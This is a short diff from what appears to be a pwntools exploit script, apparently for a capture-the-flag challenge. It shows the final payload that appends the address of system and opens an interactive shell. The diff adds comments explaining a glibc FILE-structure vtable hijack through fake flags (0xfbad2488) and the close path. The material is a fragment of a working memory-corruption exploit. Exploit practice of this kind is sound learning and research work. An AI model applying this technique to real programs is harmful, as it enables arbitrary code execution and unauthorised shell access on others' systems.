@@ -80,3 +80,12 @@ payload += p32(system)
 p.sendlineafter(":", payload)
 
 p.interactive()
+
+
+#  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
+#    status = _IO_file_close_it (fp);
+# because the flag was set to 0xfbad2488
+# so (fp->_IO_file_flags & _IO_IS_FILEBUF) == 1
+# and will call _IO_file_close_it 
+# then in _IO_file_close_it  it called _IO_SYSCLOSE to jmp to __close in vtable
+#int close_status = ((fp->_flags2 & _IO_FLAGS2_NOCLOSE) == 0 ? _IO_SYSCLOSE (fp) : 0);
